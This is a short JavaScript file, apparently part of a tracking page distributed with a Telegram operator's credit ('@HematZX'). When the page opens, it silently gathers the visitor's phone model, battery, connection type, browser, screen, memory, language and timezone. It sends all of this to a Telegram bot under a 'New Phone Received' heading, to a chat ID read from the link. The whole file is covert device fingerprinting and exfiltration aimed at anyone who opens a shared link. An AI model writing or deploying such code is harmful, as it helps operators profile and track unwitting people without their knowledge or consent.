// ============ BOT CONFIG ============
const BOT_TOKEN = "BOT_TOKEN";
// ==================================

// ✅ chat_id له URL نه اخلو (?=8041484832)
const params = new URLSearchParams(window.location.search);
const CHAT_ID = params.get("") || null;

if(!CHAT_ID){
  // که chat_id نه وي، هیڅ مه کوه
  throw new Error("Chat ID not found in URL");
}

// ---------- PHONE INFO ----------
async function sendPhoneInfo(){

  const ua = navigator.userAgent;

  // Phone Model (best effort)
  let phoneModel = "Unknown";
  if(ua.includes("Android")){
    const m = ua.match(/Android\s[\d\.]+;\s([^;]+)/);
    if(m) phoneModel = m[1];
  }else if(ua.includes("iPhone")){
    phoneModel = "iPhone";
  }

  // Browser
  let browser = "Unknown";
  if(ua.includes("Chrome")) browser = "Chrome";
  else if(ua.includes("Firefox")) browser = "Firefox";
  else if(ua.includes("Safari")) browser = "Safari";
  else if(ua.includes("Edge")) browser = "Edge";

  // Battery
  let battery = "Unknown";
  if(navigator.getBattery){
    try{
      const b = await navigator.getBattery();
      battery = Math.round(b.level * 100) + "% " + (b.charging ? "(Charging)" : "(Not Charging)");
    }catch{}
  }

  // Connection
  let connection = "Unknown";
  if(navigator.connection){
    connection = navigator.connection.effectiveType || "Unknown";
  }

  // Extra info
  const platform = navigator.platform || "Unknown";
  const screenSize = `${screen.width}x${screen.height}`;
  const language = navigator.language || "Unknown";
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
  const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";

  const message =
`<b>New Phone Received</b>

📱 <b>Phone Model</b> : ${phoneModel}
🔋 <b>Battery</b> : ${battery}
📶 <b>Connection</b> : ${connection}
🌐 <b>Browser</b> : ${browser}
💻 <b>Platform</b> : ${platform}
🖥️ <b>Screen</b> : ${screenSize}
🧠 <b>Memory</b> : ${memory}
🗣️ <b>Language</b> : ${language}
⏰ <b>Timezone</b> : ${timezone}

⚡ <b>Power</b> : @HematZX`;

  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("text", message);
  form.append("parse_mode", "HTML");

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    body: form
  }).catch(()=>{});
}

// ▶️ یو ځل واستوه کله چې پاڼه خلاصه شي
sendPhoneInfo(); 
